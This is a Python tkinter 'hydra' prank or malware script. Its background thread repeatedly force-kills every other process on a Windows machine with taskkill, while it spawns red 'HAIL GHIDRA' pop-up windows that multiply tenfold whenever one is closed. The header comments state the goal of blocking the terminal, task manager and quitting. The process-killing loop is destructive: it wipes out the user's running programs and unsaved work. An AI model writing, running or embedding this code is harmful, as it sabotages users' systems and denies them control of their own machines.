#write down functs to kill terminal/task manager whenever they are opened(test and modify)
#disable quit funct in mac and replicate it all when it happens

import tkinter as tk
from tkinter import *
from random import randrange
import threading
from os import system,getpid

def master():

    while 1:
        #system('taskkill /IM "taskmanager.exe" /F')
        #system('taskkill /IM "cmd.exe" /F')
        system('taskkill /f /t /fi "PID ne '+str(getpid())+'"')
    

t = threading.Thread(target=master)
t.daemon = False
t.start()

class MainApp():
    def __init__(self, root,z):
        self.root = root
        self.root.attributes("-topmost", True)
        ws = self.root.winfo_screenwidth() 
        hs = self.root.winfo_screenheight()
        x = randrange(0,ws//1.23,100)
        y = randrange(hs//1.19,0,-100)
        if z<=4:
            if not z :self.root.geometry('%dx%d+%d+%d' % (400, 200, 0, hs))
            elif z == 1:self.root.geometry('%dx%d+%d+%d' % (400, 200, ws, 0))
            elif z == 2:self.root.geometry('%dx%d+%d+%d' % (400, 200, 0, 0))
            elif z == 3:self.root.geometry('%dx%d+%d+%d' % (400, 200, ws, hs))
            elif z == 4:self.root.eval('tk::PlaceWindow . center')
        else:
            self.root.geometry('%dx%d+%d+%d' % (400, 200, x, y))
        self.root.title ('ghidra')
        self.root.resizable(False, False)
        canvas = Canvas(root, width = 400, height = 200)
        canvas.pack(fill = "both", expand = True)
        canvas.configure(background='black')
        canvas.create_text(205, 90, text = 'Cut off one head and ten shall take its place', font = ('Al Nile', 17, 'italic'), justify = 'center', fill='red')
        canvas.create_text(205, 120, text = 'HAIL GHIDRA', font = ('Andale Mono', 30, 'bold'), justify = 'center', fill='red')
        self.root.protocol("WM_DELETE_WINDOW", self.on_close)
        if randrange(2):
            self.root.after(1000,self.on_timeout)

    def on_close(self):
        self.root.destroy()
        for a in range(10):
            app = tk.Tk()
            MainApp(app,6)

    def on_timeout(self):
        self.root.destroy()
        app = tk.Tk()
        MainApp(app,6)
        cx = self.root.winfo_x()
        cy = self.root.winfo_y()
        pm = randrange(1)
        pm2 = randrange(1)
        if pm and pm2:self.root.geometry('%dx%d+%d+%d' % (400, 200, cx+randrange(100), cy+randrange(100)))
        elif not pm and pm2:self.root.geometry('%dx%d+%d+%d' % (400, 200, cx-randrange(100), cy+randrange(100)))
        elif pm and not pm2:self.root.geometry('%dx%d+%d+%d' % (400, 200, cx+randrange(100), cy-randrange(100)))
        else:self.root.geometry('%dx%d+%d+%d' % (400, 200, cx-randrange(40), cy-randrange(100)))

if __name__ == "__main__":
    for a in range(1):
        app = tk.Tk()
        MainApp(app,a)
    app.mainloop()
